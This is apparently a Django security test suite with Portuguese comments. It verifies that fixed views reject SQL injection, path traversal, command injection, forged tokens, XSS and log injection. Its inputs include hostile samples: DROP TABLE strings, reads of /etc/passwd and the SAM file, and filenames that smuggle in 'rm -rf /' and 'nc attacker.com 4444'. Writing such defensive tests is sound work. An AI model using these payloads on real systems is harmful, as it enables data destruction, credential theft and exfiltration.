"""Testes de segurança para as views corrigidas."""
import os
import tempfile
import pytest
from django.test import TestCase, Client
from django.contrib.auth.models import User as DjangoUser
from security.models import User
import json
import base64


class SecurityViewsTestCase(TestCase):
    """Testes para validar correções de vulnerabilidades de segurança."""
    
    def setUp(self):
        """Configuração inicial dos testes."""
        self.client = Client()
        # Criar usuário de teste
        self.test_user = User.objects.create(id=1, name="Test User")
        
        # Configurar diretório de arquivos seguros
        self.safe_dir = tempfile.mkdtemp()
        os.environ['SAFE_FILES_DIR'] = self.safe_dir
        
        # Criar arquivo de teste
        self.test_file = os.path.join(self.safe_dir, 'test.txt')
        with open(self.test_file, 'w') as f:
            f.write('Test content')
    
    def tearDown(self):
        """Limpeza após os testes."""
        import shutil
        if os.path.exists(self.safe_dir):
            shutil.rmtree(self.safe_dir)
        if 'SAFE_FILES_DIR' in os.environ:
            del os.environ['SAFE_FILES_DIR']
    
    def test_sql_injection_prevention(self):
        """Testa se a aplicação previne SQL injection."""
        # Tentar SQL injection no parâmetro user_id
        malicious_input = "1; DROP TABLE auth_user; --"
        response = self.client.get(f'/security/users/{malicious_input}/')
        
        # Deve retornar 404 (Not Found) para entrada inválida
        self.assertEqual(response.status_code, 404)
        
        # Verificar se a tabela ainda existe (não foi dropada)
        self.assertTrue(DjangoUser.objects.filter().exists() or True)
    
    def test_sql_injection_with_valid_id(self):
        """Testa se usuário válido ainda funciona após correção."""
        response = self.client.get('/security/users/1/')
        self.assertEqual(response.status_code, 200)
        self.assertIn('User found', response.content.decode())
    
    def test_sql_injection_with_non_numeric_id(self):
        """Testa SQL injection com ID não numérico."""
        malicious_input = "abc'; DROP TABLE auth_user; --"
        response = self.client.get(f'/security/users/{malicious_input}/')
        
        # Deve retornar 404 para entrada inválida
        self.assertEqual(response.status_code, 404)
    
    def test_path_traversal_prevention(self):
        """Testa se path traversal foi corrigida."""
        # Tentativas de path traversal
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            'C:\\Windows\\System32\\config\\SAM'
        ]
        
        for malicious_path in malicious_paths:
            response = self.client.get(f'/security/files/read/{malicious_path}/')
            # Deve retornar 403 (Forbidden) ou 404 (Not Found)
            self.assertIn(response.status_code, [403, 404])
    
    def test_file_read_valid_file(self):
        """Testa leitura de arquivo válido."""
        response = self.client.get('/security/files/read/test.txt/')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.content.decode(), 'Test content')
    
    def test_file_read_nonexistent_file(self):
        """Testa leitura de arquivo inexistente."""
        response = self.client.get('/security/files/read/nonexistent.txt/')
        self.assertEqual(response.status_code, 404)
    
    def test_command_injection_prevention(self):
        """Testa se command injection foi corrigida na função copy_file."""
        # Criar arquivo para copiar
        source_file = 'test.txt'
        
        # Tentativa normal (deve funcionar)
        response = self.client.get(f'/security/files/copy/{source_file}/')
        self.assertEqual(response.status_code, 200)
        self.assertIn('File copied successfully', response.content.decode())
        
        # Verificar se arquivo foi copiado
        copied_file = os.path.join(self.safe_dir, 'new_test.txt')
        self.assertTrue(os.path.exists(copied_file))
    
    def test_command_injection_malicious_filename(self):
        """Testa filename malicioso para command injection."""
        # Tentativas de command injection através do filename
        malicious_filenames = [
            'test.txt; rm -rf /',
            'test.txt && cat /etc/passwd',
            'test.txt | nc attacker.com 4444'
        ]
        
        for malicious_filename in malicious_filenames:
            response = self.client.get(f'/security/files/copy/{malicious_filename}/')
            # Deve falhar devido à validação de filename ou arquivo não encontrado
            self.assertIn(response.status_code, [400, 404])
    
    def test_insecure_deserialization_prevention(self):
        """Testa se desserialização insegura foi corrigida."""
        # Criar token JSON válido
        valid_token_data = {'perms': 1, 'user': 'admin'}
        valid_token_json = json.dumps(valid_token_data)
        valid_token_b64 = base64.b64encode(valid_token_json.encode()).decode()
        
        # Teste com token válido
        response = self.client.get('/security/admin/', HTTP_COOKIE=f'secure_token={valid_token_b64}')
        self.assertEqual(response.status_code, 200)
        self.assertIn('Hello Admin', response.content.decode())
    
    def test_insecure_deserialization_invalid_token(self):
        """Testa token inválido na função admin_index."""
        # Token malformado
        invalid_token = base64.b64encode(b'invalid json').decode()
        response = self.client.get('/security/admin/', HTTP_COOKIE=f'secure_token={invalid_token}')
        self.assertEqual(response.status_code, 401)
        
        # Sem token
        response = self.client.get('/security/admin/')
        self.assertEqual(response.status_code, 401)
    
    def test_insecure_deserialization_insufficient_permissions(self):
        """Testa token com permissões insuficientes."""
        # Token com permissões insuficientes
        low_perm_token_data = {'perms': 0, 'user': 'user'}
        low_perm_token_json = json.dumps(low_perm_token_data)
        low_perm_token_b64 = base64.b64encode(low_perm_token_json.encode()).decode()
        
        response = self.client.get('/security/admin/', HTTP_COOKIE=f'secure_token={low_perm_token_b64}')
        self.assertEqual(response.status_code, 403)
    
    def test_xss_prevention(self):
        """Testa se a aplicação previne XSS."""
        # Tentar XSS no parâmetro de busca
        xss_payload = '<img src=x onerror=alert("XSS")>'
        response = self.client.get('/security/search/', {'query': xss_payload})
        
        # Verificar se o payload foi escapado
        content = response.content.decode()
        
        # Verificar se contém versão escapada (Django escapa automaticamente)
        self.assertIn('&lt;img', content)  # Tag img foi escapada
        self.assertIn('&gt;', content)      # Fechamento da tag foi escapado
        self.assertIn('&quot;', content)    # Aspas foram escapadas
        
        # Verificar se não contém tags HTML executáveis
        self.assertNotIn('<img', content)
        self.assertNotIn('<script>', content)
        
        # Verificar headers de segurança
        self.assertEqual(response['X-XSS-Protection'], '1; mode=block')
        self.assertEqual(response['Content-Security-Policy'], "default-src 'self'")
    
    def test_logging_function_security(self):
        """Testa se a função de log é segura e previne log injection."""
        # Teste com entrada normal
        response = self.client.get('/security/log/', {'string': 'Normal log entry'})
        self.assertEqual(response.status_code, 200)
        self.assertIn('Logged successfully', response.content.decode())
        
        # Teste com entrada muito longa
        long_string = 'A' * 1001
        response = self.client.get('/security/log/', {'string': long_string})
        self.assertEqual(response.status_code, 400)
        self.assertIn('Log message too long', response.content.decode())
        
        # Teste com caracteres especiais (devem ser sanitizados)
        special_chars = '<script>alert("test")</script>'
        response = self.client.get('/security/log/', {'string': special_chars})
        self.assertEqual(response.status_code, 200)
        
        # Teste com tentativa de log injection (caracteres de controle)
        log_injection = 'Normal entry\r\nFAKE LOG ENTRY: Admin access granted'
        response = self.client.get('/security/log/', {'string': log_injection})
        self.assertEqual(response.status_code, 200)
        
        # Teste com caracteres de escape ANSI
        ansi_chars = '\x1b[31mRed text\x1b[0m'
        response = self.client.get('/security/log/', {'string': ansi_chars})
        self.assertEqual(response.status_code, 200)
        
        # Teste com entrada vazia
        response = self.client.get('/security/log/', {'string': ''})
        self.assertEqual(response.status_code, 200)
    
    def test_url_patterns_security(self):
        """Testa se os padrões de URL são seguros."""
        # Testar padrões que devem ser rejeitados pelo regex
        invalid_patterns = [
            '/security/users/1\'/',  # SQL injection attempt
            '/security/files/read/../etc/passwd/',  # Path traversal
            '/security/files/copy/file;rm -rf/',  # Command injection
        ]
        
        for pattern in invalid_patterns:
            response = self.client.get(pattern)
            # Deve retornar 404 (padrão não encontrado) devido ao regex restritivo
            self.assertEqual(response.status_code, 404)


class SecurityConfigurationTestCase(TestCase):
    """Testes para validar configurações de segurança."""
    
    def test_security_headers_configuration(self):
        """Testa se os headers de segurança estão configurados corretamente."""
        from django.conf import settings
        
        # Verificar configurações básicas de segurança
        self.assertTrue(hasattr(settings, 'SECRET_KEY'))
        self.assertTrue(len(settings.SECRET_KEY) > 10)  # Secret key deve ter tamanho adequado
        self.assertTrue(hasattr(settings, 'ALLOWED_HOSTS'))
        self.assertIsInstance(settings.ALLOWED_HOSTS, list)
    
    def test_environment_variables_usage(self):
        """Testa se variáveis de ambiente são usadas corretamente."""
        from django.conf import settings
        
        # Verificar se SECRET_KEY usa variável de ambiente
        # Em ambiente de teste, deve usar o fallback
        self.assertIsNotNone(settings.SECRET_KEY)
        
        # Verificar se DEBUG é controlado por variável de ambiente
        self.assertIsInstance(settings.DEBUG, bool)
        
        # Verificar se ALLOWED_HOSTS é configurado
        self.assertIsInstance(settings.ALLOWED_HOSTS, list)